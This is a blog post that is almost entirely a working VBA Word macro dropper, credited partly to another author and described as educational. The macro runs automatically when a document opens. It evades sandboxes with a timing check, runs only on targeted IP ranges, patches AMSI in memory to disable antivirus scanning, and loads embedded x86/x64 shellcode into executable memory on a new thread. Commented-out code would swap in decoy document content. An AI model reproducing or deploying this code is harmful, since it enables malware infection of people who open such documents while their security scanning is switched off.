---
layout: post
title: VB Macros | Variations
categories: xdev
permalink: /:categories/macros/
---  

All exploits are written my myself and are for educational purposes only, i would not be liable for any misuse!

###Macros with Several Variations

Credit to Ocktoberfirst on this initial macro 

```vb

Type MODULEINFO
  lpBaseOfDLL As Long
  SizeOfImage As Long
  EntryPoint As Long
End Type
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr

Function MyMacro()
 'Get current time, sleep 4 seconds, get time again.  If less than 4 seconds have passed, assume we are in a AV sandbox and exit without running rest of macro.
 Dim myTime
 myTime = Time
 Dim Timein As Date
 Timein = Date + myTime
 Sleep (4000)
 Dim second_time
 second_time = Time
 Dim Timeout As Date
 Timeout = Date + second_time
 Dim subtime As Variant
 subtime = DateDiff("s", Timein, Timeout)
 Dim vOut As Integer
 vOut = CInt(subtime)
 If subtime < 3.5 Then
    Exit Function
 End If
 'initialize variables
 Dim Is64 As Boolean
 Dim StrFile As String
 Dim check As Boolean
 Dim buf As Variant
 Dim addr As LongPtr
 Dim counter As LongPtr
 Dim data As String
 Dim res As LongPtr
 Dim ipcheck As Boolean
 ipcheck = False
 Dim inscope As String
 'define in scope IP's.  We can use wildcards here.
 inscope = "192.168.*"
 'Call ip check function.  Returns True if machine IP is in scope. If True, pass.  If False, exit.
 ipcheck = getMyIP(inscope)
 If ipcheck Then
 Else
    Exit Function
 End If
 'Dynamically resolve amsi.dll
 StrFile = Dir("c:\windows\system32\a?s?.d*")
 'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
 Is64 = arch()
 'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
 check = amcheck(StrFile)
 'This portion to delete document body and replace with auto text (the "legit" content)
 'ActiveDocument.Content.Select
 'Selection.Delete
 'ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
 'If amsi is found, call amsi patching function.  Pass architecture of Word as additional arg to function.
 If check Then
     patch StrFile, Is64
 End If
 'Include shellcode for both x86 and x64.
 'also no encryption routine on this shellcode, might have to look into something like xor or rot or caeser cipher to strengten it
 If Is64 Then
    buf = Array(49, 125, 184, 25, 37, 29, 1, 53, 53, 53, 118, 134, 118, 133, 135, 125, 102, 7, 154, 125, 192, 135, 149, 125, 192, 135, 77, 125, 192, 135, 85, 134, 139, 125, 68, 236, 127, 127, 125, 192, 167, 133, 130, 102, 254, 125, 102, 245, 225, 113, _
	150, 177, 55, 97, 85, 118, 246, 254, 66, 118, 54, 246, 23, 34, 135, 125, 192, 135, 85, 118, 134, 192, 119, 113, 125, 54, 5, 155, 182, 173, 77, 64, 55, 68, 186, 167, 53, 53, 53, 192, 181, 189, 53, 53, 53, 125, 186, 245, 169, 156, _
	125, 54, 5, 133, 192, 125, 77, 121, 192, 117, 85, 126, 54, 5, 24, 139, 130, 102, 254, 125, 52, 254, 118, 192, 105, 189, 125, 54, 11, 125, 102, 245, 118, 246, 254, 66, 225, 118, 54, 246, 109, 21, 170, 38, 129, 56, 129, 89, 61, 122, _
	110, 6, 170, 13, 141, 121, 192, 117, 89, 126, 54, 5, 155, 118, 192, 65, 125, 121, 192, 117, 81, 126, 54, 5, 118, 192, 57, 189, 118, 141, 125, 54, 5, 118, 141, 147, 142, 143, 118, 141, 118, 142, 118, 143, 125, 184, 33, 85, 118, 135, _
	52, 21, 141, 118, 142, 143, 125, 192, 71, 30, 128, 52, 52, 52, 146, 125, 102, 16, 136, 126, 243, 172, 158, 163, 158, 163, 154, 169, 53, 118, 139, 125, 190, 22, 126, 252, 247, 129, 172, 91, 60, 52, 10, 136, 136, 125, 190, 22, 136, 143, _
	130, 102, 245, 130, 102, 254, 136, 136, 126, 239, 111, 139, 174, 220, 53, 53, 53, 53, 52, 10, 29, 67, 53, 53, 53, 102, 110, 103, 99, 102, 107, 109, 99, 105, 110, 99, 107, 107, 53, 143, 125, 190, 246, 126, 252, 245, 240, 54, 53, 53, _
	130, 102, 254, 136, 136, 159, 56, 136, 126, 239, 140, 190, 212, 251, 53, 53, 53, 53, 52, 10, 29, 8, 53, 53, 53, 100, 120, 161, 155, 101, 109, 138, 157, 148, 121, 130, 150, 169, 119, 107, 172, 123, 175, 101, 171, 125, 137, 134, 173, 151, _
	155, 125, 124, 119, 108, 175, 148, 142, 161, 133, 119, 106, 134, 127, 106, 106, 134, 136, 134, 138, 170, 109, 158, 132, 131, 109, 153, 154, 105, 137, 165, 125, 124, 163, 125, 143, 159, 155, 128, 150, 158, 164, 133, 109, 121, 160, 129, 135, 134, 157, _
	124, 120, 105, 139, 106, 163, 164, 128, 158, 156, 143, 165, 158, 141, 150, 166, 136, 109, 148, 162, 142, 124, 142, 109, 155, 153, 173, 174, 98, 109, 148, 159, 142, 135, 106, 125, 150, 167, 130, 143, 167, 152, 141, 119, 134, 132, 124, 167, 102, 162, _
	159, 160, 123, 126, 169, 163, 110, 131, 107, 155, 159, 109, 103, 165, 153, 168, 174, 138, 161, 105, 109, 165, 105, 142, 163, 98, 158, 173, 173, 162, 172, 125, 133, 164, 170, 107, 173, 139, 155, 153, 160, 162, 122, 170, 125, 168, 122, 137, 133, 157, _
	158, 155, 123, 158, 167, 133, 135, 175, 170, 134, 107, 156, 150, 121, 165, 133, 168, 155, 119, 148, 131, 132, 102, 106, 126, 165, 125, 110, 160, 120, 150, 134, 125, 157, 142, 53, 125, 190, 246, 136, 143, 118, 141, 130, 102, 254, 136, 125, 237, 53, _
	103, 221, 185, 53, 53, 53, 53, 133, 136, 136, 126, 252, 247, 32, 138, 99, 112, 52, 10, 125, 190, 251, 159, 63, 148, 125, 190, 38, 159, 84, 143, 135, 157, 181, 104, 53, 53, 126, 190, 21, 159, 57, 118, 142, 126, 239, 170, 123, 211, 187, _
	53, 53, 53, 53, 52, 10, 130, 102, 245, 136, 143, 125, 190, 38, 130, 102, 254, 130, 102, 254, 136, 136, 126, 252, 247, 98, 59, 77, 176, 52, 10, 186, 245, 170, 84, 125, 252, 246, 189, 72, 53, 53, 126, 239, 121, 37, 106, 21, 53, 53, _
	53, 53, 52, 10, 125, 52, 4, 169, 55, 32, 223, 29, 138, 53, 53, 53, 136, 142, 159, 117, 143, 126, 190, 6, 246, 23, 69, 126, 252, 245, 53, 69, 53, 53, 126, 239, 141, 217, 136, 26, 53, 53, 53, 53, 52, 10, 125, 200, 136, 136, _
	125, 190, 28, 125, 190, 38, 125, 190, 15, 126, 252, 245, 53, 85, 53, 53, 126, 190, 46, 126, 239, 71, 203, 190, 23, 53, 53, 53, 53, 52, 10, 125, 184, 249, 85, 186, 245, 169, 231, 155, 192, 60, 125, 54, 248, 186, 245, 170, 7, 141, _
	248, 141, 159, 53, 142, 126, 252, 247, 37, 234, 215, 139, 52, 10)
 Else
    buf = Array(141,153,254,113,113,113,17,64,163,248,148,21,250,35,65,250,35,125,250,35,101,64,142,126,198,59,87,250,3,89,64,177,221,77,16,13,115,93,81,176,190,124,112,182,56,4,158,35,38,250,35,97,250,51,77,112,161,250,49,9,244,177,5,61,112,161,250,41,81,33,250,57,105,112,162,244,184,5,77,56,64, _
142,250,69,250,112,167,64,177,176,190,124,221,112,182,73,145,4,133,114,12,137,74,12,85,4,145,41,250,41,85,112,162,23,250,125,58,250,41,109,112,162,250,117,250,112,161,248,53,85,85,42,42,16,40,43,32,142,145,41,46,43,250,99,152,241,142,142,142,44,25,31,20,5,113,25,6,24,31,24,37, _
25,61,6,87,118,142,164,64,170,34,34,34,34,34,153,79,113,113,113,60,30,11,24,29,29,16,94,68,95,65,81,89,38,24,31,21,30,6,2,81,63,37,81,71,95,64,74,81,37,3,24,21,20,31,5,94,70,95,65,74,81,3,7,75,64,64,95,65,88,81,29,24,26,20,81,54,20,18,26,30, _
113,25,75,39,8,214,142,164,34,34,27,114,34,34,25,202,112,113,113,153,30,112,113,113,94,24,64,16,61,50,92,11,54,19,37,19,7,60,20,69,6,27,41,64,29,32,22,2,11,60,54,23,92,56,38,1,61,38,64,92,16,3,19,65,64,8,55,37,54,69,21,39,25,57,11,8,71,61,3,3, _
34,36,26,4,60,58,70,27,26,51,32,35,56,58,64,30,8,73,72,53,38,30,33,68,59,6,66,62,62,72,16,9,70,46,52,55,2,7,40,5,43,26,19,9,61,51,32,16,21,41,20,32,25,0,67,4,24,33,72,2,72,46,29,66,71,29,21,7,30,21,59,22,57,55,39,4,39,3,60,59, _
21,46,27,20,60,20,2,18,64,4,29,58,41,30,67,28,27,52,50,59,65,37,60,51,25,55,64,41,51,56,46,58,67,32,34,8,53,28,66,22,2,20,24,11,60,32,20,2,34,16,25,65,18,68,41,37,52,28,5,43,69,51,51,36,20,72,46,0,31,0,4,55,64,37,11,7,6,26,59,46, _
43,18,34,46,32,60,26,58,28,26,3,72,4,8,28,59,25,4,62,33,46,2,9,69,27,68,29,113,33,25,38,248,238,183,142,164,248,183,34,25,113,115,25,245,34,34,34,38,34,39,25,154,36,95,74,142,164,231,27,123,46,34,34,34,34,39,25,92,119,105,10,142,164,244,177,4,101,25,249,98, _
113,113,25,53,129,68,145,142,164,62,4,144,153,59,113,113,113,27,49,25,113,97,113,113,25,113,113,49,113,34,25,41,213,34,148,142,164,226,34,34,248,150,38,25,113,81,113,113,34,39,25,99,231,248,147,142,164,244,177,5,190,250,118,112,178,244,177,4,148,41,178,46,153,14,142,142,142,64,72,67, _
95,64,71,73,95,69,72,95,71,71,113,202,145,108,91,123,25,215,228,204,236,142,164,77,119,13,123,241,138,145,4,116,202,54,98,3,30,27,113,34,142,164)

End If


'Create new space in memory within current process
 addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
 'Copy shellcode to newly created memory
 For counter = LBound(buf) To UBound(buf)
 data = Hex(buf(counter))
 patched ByVal (addr + counter), 1, ByVal ("&H" & data)
 Next counter
 'create thread to execute shellcode
 res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

 Function arch() As Boolean
 'check architecture of current word process
    #If Win64 Then
        arch = True
    #Else
        arch = False
    #End If
End Function

Public Function getMyIP(ipcheck As String) As Boolean
'uses WMI to get all IP's associated with machine.  Each one is then checked against the wildcarded IP/network.  If a match is found, returns True
    Dim objWMI As Object
    Dim objQuery As Object
    Dim objQueryItem As Object
    Dim vIpAddress
    Dim counter As Integer
    Dim ips() As String
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set objQuery = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled = True")
    For Each objQueryItem In objQuery
        For Each vIpAddress In objQueryItem.ipaddress
            If CStr(vIpAddress) Like ipcheck Then
                getMyIP = True
            End If
        Next
    Next
End Function

Function amcheck(StrFile As String) As Boolean
'Checks for amsi.dll in word process. If found, returns True
Dim szProcessName As String
Dim mdi As MODULEINFO
Dim hMod(0 To 1023) As LongPtr
Dim res As LongPtr
amcheck = False
res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
For i = 0 To UBound(hMod)
    szProcessName = String$(50, 0)
    GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
    If Left(szProcessName, 8) = StrFile Then
        amcheck = True
   End If
Next i

End Function

Function patch(StrFile As String, Is64 As Boolean)
'patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.  The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them. 
' Depending on architecture these offsets vary, so a case is included for x86 and x64
Dim lib As LongPtr
Dim Func_addr As LongPtr
Dim temp As LongPtr
Dim old As LongPtr
Dim off As Integer

lib = getmod(StrFile)

If Is64 Then
    off = 96
Else
    off = 80
End If
Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
temp = VirtPro(ByVal Func_addr, 32, 64, 0)
patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
temp = VirtPro(ByVal Func_addr, 32, old, 0)

If Is64 Then
    off = 352
Else
    off = 256
End If
Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
temp = VirtPro(ByVal Func_addr, 32, 64, old)
patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
temp = VirtPro(ByVal Func_addr, 32, old, 0)

End Function

'macro name is test which calls the main method
Sub test()
 MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
```

